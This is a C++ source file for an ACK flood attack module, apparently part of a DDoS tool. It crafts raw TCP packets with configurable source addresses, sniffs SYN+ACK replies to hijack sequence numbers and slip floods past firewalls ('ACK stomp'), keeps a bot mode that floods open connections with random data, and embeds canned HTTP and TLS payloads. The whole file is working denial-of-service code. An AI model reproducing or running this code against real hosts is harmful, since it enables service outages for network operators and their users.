#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <fcntl.h>
#include <errno.h>
#include <arpa/inet.h>

#include "xtool.h"
#include "socketwrap.h"
#include "rand.h"
#include "tcpip.h"
#include "pktbuild.h"
#include "CDDoSParams.h"
#include "CAttack.h"
#include "CTcpAckAtk.h"
#include "pktbuild.h"


void CTcpAckAtk::deafult_http_params(){
	

	char * s = NULL;
	if (m_params.m_http_action == 0)
	{
		s = "GET / HTTP/1.1\r\n"
			"Accept: image/gif, image/x-xbitmap, image/jpeg, iAGENT:hp Proxy/3.0\r\n"
			"HOST:localhost\r\n\r\n";
	}

	if (m_params.m_http_action == 1)
	{

		s ="POST / HTTP/1.1\r\n"
			"Accept: image/gif, image/x-xbitmap, image/jpeg, iAGENT:hp Proxy/3.0\r\n"
			"HOST:localhost\r\n\r\n";
	}
	uint32_t pay_len= strlen(s);
	m_params.m_payload_len = pay_len;	
	m_params.set_payload_data(s, pay_len) ;

}

void CTcpAckAtk::deafult_https_params(){
	

	char * payload_data = NULL;
	uint32_t pay_len = 0;
	int flag = 0;
	if(m_params.m_tcpoptionflag ==0)
		m_params.m_tcpoptionflag = 1;

	//https 报文初始化
	if(m_params.m_https_action==0 ){ //https hello
		char* str =  "16030100a7010000a30303c4c89ec627edce6d8bc694d05508ffc722cb62239c089a94762f7be962729b37000022"
					  "c02bc02fc02cc030cca9cca8cc14cc13c009c013c00ac014009c009d002f0035000a01000058ff01000100001700"
					  "0000230000000d0012001006010603050105030401040302010203000500050100000000001200000010000e000c"
					  "02683208687474702f312e3175500000000b00020100000a00080006001d00170018";
		pay_len=strlen(str);
		payload_data = (char*)malloc(sizeof(char) * (pay_len/2 + 1) );
		flag= hex2str(payload_data, str, pay_len);
		

	
	}
	else if(m_params.m_https_action==1 ){ //https application Data  
	   char* str1 = "17030301860000000000000001cf2962b0556fb88972904758b18f26b033cbe53fd5f6bf8df6351c6a6d375dd1b3c9"
					 "58a7e8a84d1e2674a4733238b658523915225bedcb85ece0408c9fa4caf187a5bfbaa37d2684a8726ffa092c93c2c0"
					 "cb6c3da490081975fea8118fe601cd6e8cfea3a92a45ebe42723f9abe426782d94d1d7ba7305c97b54d25aa16ec59f"
					 "6bcb2e533e423e4dab83f0250a160fc26ff811db41e65656fc21a65df7a00ebbf83420f68834126ef42bac1efeaf5f"
					 "5cb1f93e9b2fef76f40b4a3115d5776b2d62752b431bd9222a7d10816c5f5a0aab86e02d9e8b878b4f54279377ea30"
					 "08dcd61e1259867d8b21890c896b15fa8ad9a175c34f6c5b87e84c1b4b9e847e00724606984287cea9a1c498ec0d45"
					 "d5cb6c2f44eca63b33a7b0e83d073fea09cfb9c931ec9b8f3e3493f8ec2dc4166c32109028b007fb2342e5bb39b4ee"
					 "50e56db9bf7c853b64d2067b2b26db4f303fac863016de77c400967b4ab3c1ef01beaf8308f58424383fb7479e5a85"
					 "cf07d4c26d293ffd1ccf494fa1cd7fb014c591";
	   pay_len=strlen(str1);
	   payload_data = (char*)malloc(sizeof(char) * (pay_len/2 + 1) );
	   flag= hex2str(payload_data, str1, pay_len);

	}
	if(flag != -1){
		m_params.set_payload_data(payload_data, pay_len/2 ) ;
		m_params.m_payload_len = pay_len/2;
	}else{
       RC_LOG_ERROR("deafult_https_params error");
	}
	if(payload_data!= NULL){
		free(payload_data);
		payload_data =NULL;
	}

}

void CTcpAckAtk::deafult_tcp_options(){
	//tcpoption默认值
	if(m_params.m_tcpoptionflag == 1  ){
		unsigned char tcp_options[20] = {
			0x02, 0x04, 0x05, 0xb4,
			0x04, 0x02,
			0x08, 0x0a, 0x00, 0x0b, 0x4a, 0x5f, 0x00, 0x00, 0x00, 0x00,
			0x01,
			0x03, 0x03, 0x06
		};	
		for(int i=0; i< 20; i++){
			m_params.m_tcp_options[i] = tcp_options[i];
		}
		m_params.m_tcpoptionflag = sizeof(tcp_options);
	}
}


int32_t CTcpAckAtk::tcp_bot_init(uint32_t dstaddr, uint16_t dport, struct attack_stomp_data *stomp_data)
{
    char err_buf[64] = {0};
    struct sockaddr_in sin;

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0)
    {
        RC_LOG_ERROR("socket error, %s!", str_error_s(err_buf, 32, errno));
        return RC_ERROR;
    }
    /*set to nonblock*/
    sock_set_unblock(fd);

    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);
    sin.sin_addr.s_addr = htonl(dstaddr);
    if (connect(fd, (struct sockaddr*)(&sin), sizeof(struct sockaddr_in)) == 0) 
    {
        stomp_data->daddr = dstaddr;
        stomp_data->dport = dport;
        stomp_data->fd = fd;
        return RC_OK;
    }

    if (errno != EINPROGRESS)
    {
        RC_LOG_DEBUG("connect failed, %s.", str_error_s(err_buf, 32, errno));
        close(fd);
        return RC_ERROR;
    }

    /*wait*/
    struct timeval tv;
    fd_set w_fds;
    int cnt = 0;

    FD_ZERO(&w_fds);
    FD_SET(fd, &w_fds);

    tv.tv_sec = 5;
    tv.tv_usec = 0;

    cnt = select(fd + 1, NULL, &w_fds, NULL, &tv);
    if (cnt < 0)
    {
        RC_LOG_ERROR("connect failed [%s]", str_error_s(err_buf, 32, errno));
        close(fd);
        return RC_ERROR;
    }
    else if (0 == cnt)
    {
        /*timeout, not recved*/
        RC_LOG_ERROR("connect timeout");
        close(fd);
        return RC_ERROR;
    }

    if (FD_ISSET(fd, &w_fds))
    {
        int err = -1;
        socklen_t len = sizeof(int);
        if ( getsockopt(fd,  SOL_SOCKET, SO_ERROR ,&err, &len) < 0 )
        {
            close(fd);
            RC_LOG_INFO("connect failed, err:%s", str_error_s(err_buf, 32, errno));
            return RC_ERROR;
        }

        if (err)
        {
            close(fd);
            RC_LOG_INFO("connect failed here, err:%s", str_error_s(err_buf, 32, err));
            return RC_ERROR;
        }

        stomp_data->daddr = dstaddr;
        stomp_data->dport = dport;
        stomp_data->fd = fd;

        /*set to block*/
        sock_set_block(fd);
        return RC_OK;
    }

    /*timeout, not recved*/
    RC_LOG_INFO("connect failed, may be not open.");
    close(fd);
    return RC_ERROR;
}


int32_t CTcpAckAtk::tcp_stomp_init(uint32_t dstaddr, uint16_t dport, struct attack_stomp_data *stomp_data)
{
    int fd = 0, rfd;
    struct sockaddr_in target,  recv_addr;
    time_t start_recv;
    uint8_t pktbuf[128] = {0};
    bool isgetstomp = false;

    // Set up receive socket
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        RC_LOG_ERROR("Could not open raw socket!");
        return RC_ERROR;
    }

    int i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        RC_LOG_ERROR("Failed to set IP_HDRINCL. Aborting");
        close(rfd);
        return RC_ERROR;
    }

    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        RC_LOG_ERROR("Failed to create socket!");
        return RC_ERROR;
    }

    // Set it in nonblocking mode
    fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
    
    memset(&target, 0, sizeof(struct sockaddr_in));
    target.sin_family = AF_INET;
    target.sin_port = htons(dport);
    target.sin_addr.s_addr = htonl(dstaddr);

    // Actually connect, nonblocking
    connect(fd, (struct sockaddr *)&target, sizeof(struct sockaddr_in));
    start_recv = time(NULL);

    // Get info
    while (TRUE)
    {
        int ret;
        int recv_addr_len = sizeof (struct sockaddr_in);
        ret = recvfrom(rfd, pktbuf, sizeof (pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, (socklen_t*)&recv_addr_len);
        if (ret == -1)
        {
            RC_LOG_ERROR("Could not listen on raw socket!");
            return RC_ERROR;
        }
        if (recv_addr.sin_addr.s_addr == target.sin_addr.s_addr && (ret >= (int)(sizeof (IP_HEADER_T) + sizeof(TCP_HEADER_T))))
        {
            IP_HEADER_T *iph = (IP_HEADER_T*)pktbuf;
            TCP_HEADER_T *tcph = (TCP_HEADER_T*)(pktbuf + sizeof (IP_HEADER_T));

            if (tcph->th_sport == target.sin_port)
            {
                if ((tcph->th_flag & FLAG_SYN) && (tcph->th_flag & FLAG_ACK))
                {
                    stomp_data->daddr = ntohl(iph->sourceIP);
                    stomp_data->saddr = ntohl(iph->destIP);
                    stomp_data->seq = ntohl(tcph->th_seq);
                    stomp_data->ack_seq = ntohl(tcph->th_ack);
                    stomp_data->sport = ntohs(tcph->th_dport);
                    stomp_data->dport = ntohs(tcph->th_sport);
                    stomp_data->fd = fd;

                    isgetstomp = true;
                    RC_LOG_INFO("ACK Stomp got SYN+ACK!");
                    break;
                }
                else if ((tcph->th_flag & FLAG_FIN) || (tcph->th_flag & FLAG_RST))
                {
                    break;
                }
            }
        }

        if (time(NULL) - start_recv > 10)
        {
            RC_LOG_DEBUG("Couldn't connect to host %s:%d for ACK Stomp in time.", 
                ip_to_str(htonl(dstaddr)), dport);
            break;
        }
    }

    close(rfd);

    if (isgetstomp)
    {
        return RC_OK;
    }

    RC_LOG_INFO("ACK Stomp no SYN+ACK!");
    /*close connected fd*/
    close(fd);
    return RC_ERROR;
}

struct attack_stomp_data* CTcpAckAtk::get_cur_stomp_data()
{
    struct attack_stomp_data *stomp_data = NULL;
    uint32_t tmp_pos = m_cur_stomp_pos;

    while(true)
    {
        stomp_data = m_stomp_data[m_cur_stomp_pos];
        if (stomp_data != NULL)
        {
            if (stomp_data->fd != -1)
            {
                return stomp_data;
            }
        }

        if (m_cur_stomp_pos == tmp_pos)
        {
            /*have a loop, but no stomp*/
            break;
        }

        m_cur_stomp_pos++;
        if (m_cur_stomp_pos >= m_stomp_cnt)
        {
            m_cur_stomp_pos = 0;
        }
    }

    return NULL;
}

bool CTcpAckAtk::check_params()
{
    if (m_params.m_payload_len > 1460)
    {
        m_params.m_payload_len = 1460;
    }
    RC_LOG_INFO("check_params = %s",m_params.m_payload_data);

    if (m_params.m_is_passfw || m_params.m_is_bot)
    {
        if (m_params.m_srcnet.begin_addr != 0)
        {
            printf("Attention:specific sourceIp not affect when ack flood with bot\n");
        }
    }
    return true;
}

int CTcpAckAtk::start()
{
    RC_LOG_WARN("CTcpAckAtk::start()");
	RC_LOG_WARN("m_params %d %s",m_params.m_payload_len, m_params.m_payload_data);
    if (m_params.m_is_passfw || m_params.m_is_bot)
    {
        /*get stomp data*/
        uint32_t cur_pos = 0;
        uint32_t dstaddr = 0;
        uint16_t dport = 0;

        for (uint32_t ii = 0; ii < m_params.m_concurrent_cnt; ii++)
        {
            for (dstaddr = m_params.m_dstnet.begin_addr; 
                dstaddr <= m_params.m_dstnet.end_addr;
                dstaddr++)
            {
                for (dport = m_params.m_dstport.begin_port;
                    dport <= m_params.m_dstport.end_port;
                    dport++)
                {
                    struct attack_stomp_data stomp_data;
                    int ret = RC_OK;
                    
                    if (m_params.m_is_passfw)
                    {
                        ret = tcp_stomp_init(dstaddr, dport, &stomp_data);
                    }
                    else if (m_params.m_is_bot)
                    {
                        ret = tcp_bot_init(dstaddr, dport, &stomp_data);
                    }

                    if (ret == RC_OK)
                    {
                        m_stomp_data[cur_pos] = (struct attack_stomp_data*)malloc(sizeof(struct attack_stomp_data));
                        memcpy(m_stomp_data[cur_pos], &stomp_data, sizeof(struct attack_stomp_data));
                        cur_pos++;

                        if (cur_pos >= MAX_CONCUR_CNT)
                        {
                            return RC_OK;
                        }

                        /*try next dst addr*/
                        break;
                    }
                }
            }
        }

        if (cur_pos == 0)
        {
            RC_LOG_WARN("no stomp info when attack stomp ack");
            return RC_ERROR;
        }

        RC_LOG_INFO("get %d stomp data", cur_pos);
        m_stomp_cnt = cur_pos;
    }

    if (m_params.m_is_passfw)
    {
        uint32_t ii = 0;
        pdu_l3_desc_t layer3;

        layer3.vlanid = m_params.m_vlan_id;
        layer3.dstaddr = 0;
        layer3.srcaddr = 0;
        layer3.identity = m_params.m_identity;
        layer3.ttl = m_params.m_ttl;
        layer3.tcpflag = m_params.m_tcpflag;
        layer3.dont_frag = m_params.m_dont_frag;
        layer3.seq = 0;
        layer3.ack = 0;
        layer3.dport = 0;
        layer3.sport = 0;
        layer3.payload_len = m_params.m_payload_len;

        for (ii = 0; ii < g_thrd_cnt; ii++)
        {
            m_fd[ii] = init_raw_tcp_socket();
            if (m_fd[ii] == -1)
            {
                return RC_ERROR;
            }
            
            m_pkt_buf[ii] = (char*)malloc(ATTACK_BUF_LEN);
            modify_tcp_ack(&layer3, m_pkt_buf[ii], ATTACK_BUF_LEN, m_params.m_payload_data);
        }   
    }
    else if (!m_params.m_is_bot)
    {
        
        uint32_t ii = 0;
        pdu_l3_desc_t layer3;
		if(get_layer3_info(layer3) ==false){
			return RC_ERROR;
		}

        for (ii = 0; ii < g_thrd_cnt; ii++)
        {
            RC_LOG_WARN("CTcpAckAtk::start() ii  %d ",ii );
            m_fd[ii] = init_raw_tcp_socket();
            if (m_fd[ii] == -1)
            {
                return RC_ERROR;
            }
            
            m_pkt_buf[ii] = (char*)malloc(ATTACK_BUF_LEN);
			modify_tcp_ack(&layer3, m_pkt_buf[ii], ATTACK_BUF_LEN, m_params.m_payload_data);

        }   
    }


    if(m_params.m_ip_type == IP_V6){
		char errbuf[LIBNET_ERRBUF_SIZE];
		m_libnet= libnet_init(LIBNET_RAW6, /* injection type */
							NULL, /* network interface */
							errbuf); /* error buffer */
		if (m_libnet == NULL)
		{				
		
			RC_LOG_ERROR("libnet_init() failed: %s", errbuf);				
		
		}	
		libnet_seed_prand(m_libnet);
	}
	
    return RC_OK;
}

void CTcpAckAtk::stop()
{
    if (m_params.m_is_passfw || m_params.m_is_bot)
    {
        for (uint32_t ii = 0; ii < m_stomp_cnt; ii++)
        {
            if (m_stomp_data[ii])
            {
                if (m_stomp_data[ii]->fd != -1)
                {
                    close(m_stomp_data[ii]->fd);
                }

                free(m_stomp_data[ii]);
                m_stomp_data[ii] = NULL;
            }
        }
    }

    if (m_params.m_is_passfw || !m_params.m_is_bot)
    {
        common_free();
    }
}
bool CTcpAckAtk::get_layer3_info(pdu_l3_desc_t& layer3) {
	if (m_params.m_is_passfw){
        struct attack_stomp_data *stomp_data = get_cur_stomp_data();
        if (NULL == stomp_data)
        {
            RC_LOG_ERROR("no stomp data when send bot ack.");
            return false;
        }

        layer3.vlanid = m_params.m_vlan_id;
        layer3.dstaddr = stomp_data->daddr;
        layer3.srcaddr = stomp_data->saddr;
		layer3.dstaddr6 = get_cur_dstaddr6();
		layer3.srcaddr6 = get_cur_srcaddr6();	
        layer3.identity = m_params.m_identity;
        layer3.ttl = m_params.m_ttl;
        layer3.tcpflag = m_params.m_tcpflag;
        layer3.dont_frag = m_params.m_dont_frag;
        layer3.seq = stomp_data->seq;
        layer3.ack = stomp_data->ack_seq;
        layer3.dport = stomp_data->dport;
        layer3.sport = stomp_data->sport;
        layer3.payload_len = m_params.m_payload_len;
        /*modify seq for next send*/
        stomp_data->seq += m_params.m_payload_len;
	    layer3.ip_type = m_params.m_ip_type;
	    layer3.iph_proto = m_params.m_iph_proto;
		

	}else{
        layer3.vlanid = m_params.m_vlan_id;
        layer3.dstaddr = get_cur_dstaddr();
        layer3.srcaddr = get_cur_srcaddr();
		layer3.dstaddr6 = get_cur_dstaddr6();
		layer3.srcaddr6 = get_cur_srcaddr6();			
        layer3.identity = m_params.m_identity;
        layer3.ttl = m_params.m_ttl;
        layer3.tcpflag = m_params.m_tcpflag;
        layer3.dont_frag = m_params.m_dont_frag;
        layer3.seq = get_cur_seq();
        layer3.ack = get_cur_ack();
        layer3.dport = get_cur_dstport();
        layer3.sport = get_cur_srcport();
        layer3.payload_len = m_params.m_payload_len;
		layer3.tcpoptionflag = m_params.m_tcpoptionflag;
	    layer3.ip_type = m_params.m_ip_type;
	    layer3.iph_proto = m_params.m_iph_proto;
	}
	
	if(m_params.m_tcpoptionflag>0){
	   util_memcpy(layer3.tcpoptions, m_params.m_tcp_options, m_params.m_tcpoptionflag);
	}

	layer3.layer3_total_len = sizeof(TCP_HEADER_T) +m_params.m_payload_len+m_params.m_tcpoptionflag;


    return true;
}

int32_t CTcpAckAtk::attack_one_pkt(int thrd_index) 
{



    if(m_params.m_ip_type==IP_V6){
		pdu_l3_desc_t layer3 ;
		
		if(get_layer3_info(layer3) ==false){
			return RC_ERROR;
		}
        int c = 0;
       if(layer3.tcpoptionflag!=0){
			libnet_build_tcp_options((uint8_t*)layer3.tcpoptions,layer3.tcpoptionflag,m_libnet,0);
	   }
		
		libnet_build_tcp(layer3.sport ,
						layer3.dport,
						libnet_get_prand(LIBNET_PRu32),/*seq*/
						libnet_get_prand(LIBNET_PRu32),/*ack*/
						layer3.tcpflag, 
						libnet_get_prand(LIBNET_PRu16),/*win*/
					    0, /*sum*/
					    0, /*urg*/
					    LIBNET_TCP_H,/*len*/
						(uint8_t*)m_params.m_payload_data,
						m_params.m_payload_len, 
						m_libnet,
						0);
		//printf("\n t=%d\n",t);
		libnet_build_ipv6(
			0, 
			0,
			LIBNET_TCP_H+m_params.m_tcpoptionflag + m_params.m_payload_len,
			IPPROTO_TCP, 
			64, 
            layer3.srcaddr6,
            layer3.dstaddr6,
			NULL, 
			0, 
			m_libnet, 
			0);

        char srcname[255]={0};
		libnet_addr2name6_r(layer3.srcaddr6,1,srcname,255);
		char dstname[255]={0};
		libnet_addr2name6_r(layer3.dstaddr6,1,dstname,255);
		RC_LOG_INFO("%15s/%5d -> %15s/%5d\n", srcname,layer3.sport,dstname,layer3.dport);

		c = libnet_write(m_libnet);
		if (c == -1)
		{
			RC_LOG_ERROR("libnet_write: %s\n", libnet_geterror(m_libnet));
		}
		libnet_clear_packet(m_libnet);		
	
		return RC_OK;
	}

    if(m_params.m_is_bot)
    {
        struct attack_stomp_data *stomp_data = get_cur_stomp_data();
        if (NULL == stomp_data)
        {
            RC_LOG_ERROR("no stomp data when send bot ack.");
            return RC_ERROR;
        }

        char pkt[ATTACK_BUF_LEN] = {0};
        rand_str((char*)pkt, m_params.m_payload_len);
        int ret = send(stomp_data->fd, pkt, m_params.m_payload_len, MSG_NOSIGNAL);
        if (ret != (int)m_params.m_payload_len)
        {
            if (errno != EAGAIN && errno != EINPROGRESS)
            {
                char err_buf[64] = {0};
                RC_LOG_ERROR("send failed, ret %d, fd %d, err %d, %s, try reconnect.\n",
                        ret, stomp_data->fd,  errno, str_error_s(err_buf, sizeof(err_buf), errno));
                
                close(stomp_data->fd);
                stomp_data->fd = -1;

                if (RC_OK != tcp_bot_init(stomp_data->daddr, stomp_data->dport, stomp_data))
                {
                    stomp_data->fd = -1;
                }
            }
        } 
    }
    else 
    {
        pdu_l3_desc_t layer3 ;
		
		if(get_layer3_info(layer3) ==false){
			return RC_ERROR;
		}
		//	RC_LOG_INFO("send ----------, %d, %s.",layer3.payload_len,m_params.m_payload_data);
		int pkt_len=0;
		pkt_len = modify_tcp_ack(&layer3, m_pkt_buf[thrd_index], ATTACK_BUF_LEN,  NULL);
		sendpkt( layer3.dstaddr, layer3.dport,  pkt_len,  thrd_index);
    }
    return RC_OK;
}



uint32_t CTcpAckAtk::modify_tcp_ack(pdu_l3_desc_t *pdu_desc, char *buffer, uint32_t buffer_len, char* payload)
{


    int send_len = 0;
    IP_HEADER_T *iphdr = NULL;
    TCP_HEADER_T *tcphdr = NULL;

    send_len +=  copy_ip_header(buffer, buffer_len, pdu_desc);


    tcphdr = (TCP_HEADER_T*)&buffer[send_len];
    tcphdr->th_sport = htons(pdu_desc->sport);
    tcphdr->th_dport = htons(pdu_desc->dport);

    tcphdr->th_seq  = htonl(pdu_desc->seq);
    tcphdr->th_ack  = htonl(pdu_desc->ack);
    tcphdr->th_lenres   =  (sizeof(TCP_HEADER_T) /4)<<4 ;//如何计算偏移
    tcphdr->th_flag = pdu_desc->tcpflag;//
    tcphdr->th_win  = htons(16384);
    tcphdr->th_urp = 0;   
    tcphdr->th_sum = 0;//校验和

    send_len += sizeof(TCP_HEADER_T);
	
	if(pdu_desc->tcpoptionflag!= 0){
		tcphdr->th_lenres	= ((sizeof(TCP_HEADER_T) + pdu_desc->tcpoptionflag)/4<<4 | 0);
		memcpy(&buffer[send_len],pdu_desc->tcpoptions , pdu_desc->tcpoptionflag);
		
		send_len += pdu_desc->tcpoptionflag;
	}

    if (pdu_desc->payload_len > 0)
    {

        if (payload != NULL)
        {
            util_memcpy(&buffer[send_len], payload, pdu_desc->payload_len);
        }
        else
        {
            /*payload不变*/
        }
        send_len +=  pdu_desc->payload_len;
    }
    iphdr = (IP_HEADER_T*)&buffer[0];
    tcphdr->th_sum = compute_tcp_checksum(iphdr, tcphdr, pdu_desc->layer3_total_len);
    return send_len;
}



